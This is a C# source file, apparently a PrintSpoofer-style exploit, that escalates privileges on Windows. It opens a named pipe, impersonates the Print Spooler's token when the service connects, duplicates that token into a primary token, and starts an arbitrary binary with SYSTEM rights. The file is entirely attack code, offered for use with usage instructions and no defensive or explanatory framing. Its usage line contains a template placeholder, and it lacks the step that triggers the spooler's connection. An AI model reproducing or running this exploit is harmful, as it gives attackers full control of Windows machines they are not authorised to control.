using System;
using System.Runtime.InteropServices;

namespace PrintSpooferExploit
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: PrintSpoofer.exe <pipename> <binary>");
                Console.WriteLine("Example: PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}");
                return;
            }

            string pipeName = args[0];
            string binaryPath = args[1];

            // Create named pipe
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (hPipe == IntPtr.Zero || hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[-] Failed to create named pipe");
                return;
            }
            Console.WriteLine($"[+] Created named pipe: {pipeName}");

            // Wait for connection from Print Spooler
            Console.WriteLine("[*] Waiting for Print Spooler to connect...");
            bool connected = ConnectNamedPipe(hPipe, IntPtr.Zero);
            if (!connected)
            {
                Console.WriteLine("[-] Failed to connect to pipe");
                CloseHandle(hPipe);
                return;
            }
            Console.WriteLine("[+] Print Spooler connected!");

            // Impersonate client
            if (!ImpersonateNamedPipeClient(hPipe))
            {
                Console.WriteLine("[-] Failed to impersonate client");
                CloseHandle(hPipe);
                return;
            }
            Console.WriteLine("[+] Impersonated Print Spooler token");

            // Get impersonation token
            IntPtr hToken;
            if (!OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken))
            {
                Console.WriteLine("[-] Failed to get thread token");
                CloseHandle(hPipe);
                return;
            }
            Console.WriteLine("[+] Got impersonation token");

            // Duplicate to primary token
            IntPtr hPrimaryToken;
            if (!DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hPrimaryToken))
            {
                Console.WriteLine("[-] Failed to duplicate token");
                CloseHandle(hToken);
                CloseHandle(hPipe);
                return;
            }
            Console.WriteLine("[+] Duplicated to primary token");

            // Revert to self
            SetThreadToken(IntPtr.Zero, IntPtr.Zero);

            // Spawn process with SYSTEM token
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            if (!CreateProcessWithTokenW(hPrimaryToken, 0, null, binaryPath, 0, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[-] Failed to create process with token");
                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);
                CloseHandle(hPipe);
                return;
            }

            Console.WriteLine($"[+] Spawned {binaryPath} with SYSTEM privileges!");
            Console.WriteLine($"[+] Process ID: {pi.dwProcessId}");

            // Cleanup
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hPrimaryToken);
            CloseHandle(hToken);
            CloseHandle(hPipe);
        }
    }
}
